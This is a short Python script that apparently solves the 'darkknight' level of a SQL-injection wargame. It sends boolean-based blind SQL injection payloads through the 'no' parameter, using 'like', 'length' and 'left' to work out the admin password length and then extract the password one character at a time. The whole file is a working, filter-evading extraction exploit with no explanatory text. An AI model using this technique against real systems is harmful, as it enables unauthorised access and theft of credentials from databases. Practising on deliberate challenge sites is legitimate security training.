import requests
import string
import os
from dotenv import load_dotenv

load_dotenv()

base_url = "https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
cookie = {"PHPSESSID": os.getenv('PHPSESSID')}
pw_length = 0
pw = ""

a = string.printable

for i in range(100):
    res = requests.get(base_url, params={
                       'no': f"""0 or id like "admin" and length(pw) like {i}"""}, cookies=cookie).text
    if "Hello admin" in res:
        print(f"length: {i}")
        pw_length = i
        break

for i in range(pw_length):
    for j in a:
        res = requests.get(base_url, params={
            'no': f"""0 or id like "admin" and left(pw, {i + 1}) like "{pw + j}" """}, cookies=cookie).text
        if "Hello admin" in res:
            print(f"pw[{i}] == {j}")
            pw += j
            break
print(pw)
